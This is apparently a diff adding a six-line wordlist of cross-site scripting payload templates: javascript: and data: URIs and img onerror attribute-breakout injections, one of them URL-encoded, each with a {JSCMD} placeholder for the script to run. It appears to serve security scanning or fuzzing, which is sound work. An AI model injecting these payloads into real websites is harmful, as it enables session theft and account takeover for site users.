@@ -1,0 +1,6 @@
+javascript:{JSCMD}
+javascript:/*x*/{JSCMD}
+data:text/html,<script>{JSCMD}</script>
+#"><img src=x onerror={JSCMD}>
+?"><img src=x onerror={JSCMD}>
+%22%3E%3Cimg%20src%3Dx%20onerror%3D{JSCMD}%3E
